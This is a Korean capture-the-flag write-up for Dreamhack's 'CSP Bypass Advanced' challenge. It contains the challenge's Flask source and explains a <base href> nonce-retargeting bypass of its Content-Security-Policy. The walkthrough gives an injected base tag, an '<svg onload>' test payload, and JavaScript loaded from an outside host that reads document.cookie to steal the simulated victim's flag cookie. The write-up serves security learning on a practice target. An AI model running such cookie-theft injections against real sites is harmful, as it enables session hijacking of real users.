# [Dreamhack Wargame] CSP Bypass Advanced
### [🚩CSP Bypass Advanced](https://dreamhack.io/wargame/challenges/436/)
<img width="1067" alt="CSP Bypass Advanced_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/d839d3a0-65a3-469f-8256-532fb736fc5c">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"


def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True


def check_xss(param, cookie={"name": "name", "value": "value"}):
    # 전달받은 param 값을 param 파라미터의 값으로 하여 vuln 페이지에 접속하는 URL 주소를 생성함
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    
    # read_url 함수에 생성한 URL 주소와 쿠키 값을 인자로 넘겨주어 vuln 페이지에 접속함
    return read_url(url, cookie)


@app.after_request
def add_header(response): # HTTP 응답에 CSP 헤더를 추가하는 함수
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'self' 'nonce-{nonce}'; object-src 'none'" # CSP 정책 지시문 내용 (아래의 표를 참고)
    nonce = os.urandom(16).hex() # nonce (랜덤한 난수 값) → 공격자가 유추할 수 없음
    return response


# 인덱스 페이지
@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)


# vuln 페이지: 이용자가 입력한 값을 출력함
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "") # 이용자가 전달한 param 파라미터의 값을 가져옴
    
    # render_template 함수를 이용해 HTML 엔티티 코드로 변환하여 이용자의 입력값을 출력함
    return render_template("vuln.html", param=param, nonce=nonce)


# flag 페이지: 전달된 URL에 임의 이용자가 접속하게끔 함 (해당 이용자의 쿠키에는 FLAG가 존재함)
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET": # GET 메소드로 요청 시
        return render_template("flag.html", nonce=nonce) # 이용자에게 URL를 입력받는 페이지(flag.html)를 화면에 출력함
    elif request.method == "POST": # POST 메소드로 요청 시
        param = request.form.get("param") # 이용자가 입력한 param의 값을 가져옴
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}): # param 파라미터의 값과 쿠키에 FLAG을 포함하여 check_xss 함수를 호출함
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'


memo_text = "" # memo 페이지에서 사용할 변수

# memo 페이지: 이용자가 메모를 남길 수 있으며, 작성한 메모를 출력함
@app.route("/memo")
def memo():
    global memo_text # memo_text를 전역으로 설정
    text = request.args.get("memo", "") # 이용자가 전달한 memo 파라미터의 값을 가져옴
    memo_text += text + "\n" # memo_text의 뒤에 이용자가 입력한 값(text)와 개행 문자(\n)를 추가함
    
    # render_template 함수를 이용해 memo_text의 값을 기록하고 출력함
    return render_template("memo.html", memo=memo_text, nonce=nonce)


app.run(host="0.0.0.0", port=8000)
```
* ```add_header``` 함수의 ```Content-Security-Policy``` HTTP 헤더에 정의된 정책 지시문
    | directive | value | 설명 |
    |---|---|------|
    | ```default-src``` | ```'self'``` | 모든 리소스의 출처를 현재 페이지와 같은 출처로 제한함 |
    | ```img-src``` | ```https://dreamhack.io``` | 이미지의 출처를 ```https://dreamhack.io```로 제한함 |
    | ```style-src``` | ```'self' 'unsafe-inline'``` | 스타일시트의 권한과 출처를 현재 페이지와 같은 출처로 제한하고, <br/>스타일시트 내 인라인 코드의 사용을 허용함 |
    | ```script-src``` | ```'self' 'nonce-{nonce}'``` | 스크립트 태그의 출처는 현재 페이지와 같은 출처로 제한하고, <br/>nonce 속성에 {nonce} 값이 존재하지 않으면 스크립트 로드에 실패함 |
    | ```object-src``` | ```'none'``` | ```<object>```, ```<embeded>``` 태그의 출처로 어느 것도 허용하지 않음 <br/> &nbsp;&nbsp;→ 📚 [CSP: object-src docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/object-src) 참고 |


<br/><br/>

## 문제 풀이
### 취약점 분석
CSP 정책을 살펴보면 ```nonce``` CSP 구문을 지정했지만 ```base-uri``` CSP 구문을 지정하지 않아 ```base``` 태그로 임의 자원을 로드할 수 있는 취약점(Nonce Retargeting)이 존재함
* ```<base>``` 태그의 ```href``` 속성을 이용해 외부 웹 서버로 경로가 해석되는 기준점을 변경하고, 이를 이용해 원하는 스크립트를 실행하게 만들 수 있음
    - flag 페이지를 작동 방식을 보면 ```<svg onload=alert(1);>```를 입력한 후 제출 버튼을 누르고 출력된 "good" 알림창의 확인 버튼까지 누르고 나면 개발자 도구의 Network 탭을 통해 아래 js 파일들이 포함되는 것을 확인할 수 있음
      <br/><br/>
      <img width="2560" alt="취약점 분석" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/fc2ffa47-a8ae-4285-8342-48056ab12701">
      <img width="2560" alt="js 파일 확인" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/b401cd92-7372-477b-a007-bcdc2a0d4000"><br/><br/>
        + 이 점을 이용해 외부 웹 서버에 bootstrap.min.js를 생성하고 쿠키 정보를 이용할 수 있는 코드를 작성하여 익스플로잇을 수행할 수 있음

<br/><br/>

### 익스플로잇
📌 여기서는 Github에서 제공하는 웹 서버 호스팅 기능(```https://깃허브아이디.github.io/```)을 이용함 (그 외 다른 방법으로 개인 서버를 사용해도 가능함)

<br/>

1. 외부 웹 서버로 사용할 ```https://augustf86.github.io/```에서 static/js/boostrap.min.js를 아래와 같이 생성함
   <br/><br/>
   <img width="2560" alt="익스플로잇1" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/03dbb894-a330-48e3-b83e-b230588df610"><br/><br/>
    - 사이트에서 전송하던 bootstrap.min.js 파일을 복사하여 붙여넣기 한 후 아래에 다음을 추가함
        ```javascript
        var xmlHttp = new XMLHttpRequest();
        var x = "http://127.0.0.1:8000/memo?memo=" + document.cookie;
        xmlHttp.open('GET', x, true);
        xmlHttp.send();
        ```
<br/>

2. flag 페이지에서 ```<base href="https://augustf86.github.io/">```를 입력하고 제출 버튼울 클릭함
3. "good" 알림창이 출력되면 memo 페이지로 이동하여 화면에 출력된 임의 이용자의 쿠키 정보(FLAG)를 획득함
   <br/><br/>
   <img width="2560" alt="익스플로잇 2,3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/f51fb725-9fb6-4d1b-8b8c-e4361041a608"><br/><br/>
